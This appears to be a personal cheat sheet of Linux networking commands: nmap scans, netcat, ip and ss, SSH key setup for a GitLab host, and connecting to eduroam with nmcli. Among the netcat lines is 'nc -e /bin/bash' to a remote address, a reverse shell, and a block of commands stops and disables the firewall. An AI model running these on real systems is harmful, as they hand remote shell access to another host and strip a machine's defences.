[Debian network config](https://wiki.debian.org/NetworkConfiguration)

Connect to a network [using iwd](https://wiki.archlinux.org/title/Iwd#Connect_to_a_network)

[IWD](https://iwd.wiki.kernel.org) is an alternative to wpa\_supplicant.

[Manage network connections from the Linux command line with nmcli](https://opensource.com/article/20/7/nmcli)

[iwlwifi](https://wireless.wiki.kernel.org/en/users/drivers/iwlwifi) is the wireless driver for Intel's wireless chips.

nmap

On Windows npmap depends npcap.

nmap -sn 192.168.1.0/24

nmap -sS -p 22 10.8.18.0/24

nmap -sT localhost

nc

nc -lvvp 8000
nc -e /bin/bash 192.168.199.102 8000

ping

dig

ip & traceroute

ip address

netcat

netstat -luntp

ss

ss -lntp

httpie

```
systemctl stop firewallld
systemctl disable firewallld
service iptables stop
```

https://hnd-jp-ping.vultr.com/


## Setup SSH auth for code hosting platforms

`gitlab.aicrowd.com` as an example.

```shell
> ssh-keygen -t ed25519 -C "WSL on Samsung Laptop"
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/devel/.ssh/id_ed25519): /home/devel/.ssh/gitlab_aicrowd_com_ed25519
```

```
~/.ssh/config
-------------
Host gitlab.aicrowd.com
  PreferredAuthentications publickey
  IdentityFile ~/.ssh/gitlab_aicrowd_com_ed25519
```

Testing: 
- `ssh -T git@gitlab.aicrowd.com`
- `ssh -Tvvv git@gitlab.aicrowd.com` gives verbose console info

### Connect to eduroam via nmcli

`ip link show` to get the names of wireless devices. Assume the name is `wlan0`.
```shell
> nmcli con add type wifi con-name "eduroam" ifname wlan0 ssid "eduroam" wifi-sec.key-mgmt wpa-eap 802-1x.identity "someone@where" 802-1x.password "password" 802-1x.system-ca-certs yes 802-1x.eap "peap" 802-1x.phase2-auth mschapv2
> nmcli connection up eduroam --ask
```
May then be prompted to enter the wifi username and password, however the fields should already be filled in and just need to press enter.
